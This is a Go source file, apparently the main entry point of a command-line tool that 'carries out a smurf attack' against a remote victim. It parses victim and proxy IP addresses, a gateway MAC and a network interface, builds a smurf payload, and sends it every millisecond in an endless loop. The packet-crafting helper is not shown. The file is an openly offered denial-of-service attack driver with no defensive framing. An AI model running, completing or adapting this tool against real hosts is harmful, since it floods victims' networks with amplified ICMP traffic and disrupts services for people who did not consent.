package main

import (
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"time"

	"github.com/pkg/errors"
	cli "gopkg.in/urfave/cli.v1"
)

var version string // injected at build-time

func attackValidator(ctx *cli.Context) error {
	return assertSet(ctx, victimFlag, proxyFlag, gatewayFlag, ifaceFlag)
}

func attackHandler(ctx *cli.Context) error {
	banner := "Victim: %s\nICMP to: %s\nRun Every: %s\nPayload:\n---\n%v---\n"

	gw, err := net.ParseMAC(ctx.String(name(gatewayFlag)))
	if err != nil {
		return errors.Wrap(err, "could not parse gateway MAC address")
	}

	conf := config{
		victim:     net.ParseIP(ctx.String(name(victimFlag))),
		proxy:      net.ParseIP(ctx.String(name(proxyFlag))),
		iface:      ctx.String(name(ifaceFlag)),
		gatewayMAC: gw,
	}

	if conf.victim == nil {
		return errors.Wrap(err, "invalid victim IP address")
	}

	if conf.proxy == nil {
		return errors.Wrap(err, "invalid proxy IP address")
	}

	s, err := newSmurf(conf)
	if err != nil {
		return err
	}

	interval := time.Millisecond * 1
	fmt.Printf(banner, conf.victim, conf.proxy, interval.String(), hex.Dump(s.payload))
	for {
		if err = s.execute(); err != nil {
			return err
		}
		time.Sleep(interval)
	}
}

func main() {
	app := cli.NewApp()
	app.Version = version
	app.EnableBashCompletion = true
	app.Usage = "carry out a smurf attack!"
	app.Commands = []cli.Command{
		{
			Name:    "attack",
			Aliases: []string{"r"},
			Usage:   "carry out a smurf attack against a remote victim",
			Flags: []cli.Flag{
				asMandatory(victimFlag),
				asMandatory(proxyFlag),
				withDefault(gatewayFlag, "192.168.0.254"),
				withDefault(ifaceFlag, "en0"),
			},
			Before: attackValidator,
			Action: attackHandler,
		},
	}
	app.CommandNotFound = func(c *cli.Context, command string) {
		c.App.Run([]string{"help"})
		fmt.Printf("\ncommand \"%s\" does not exist\n", command)
	}
	if err := app.Run(os.Args); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
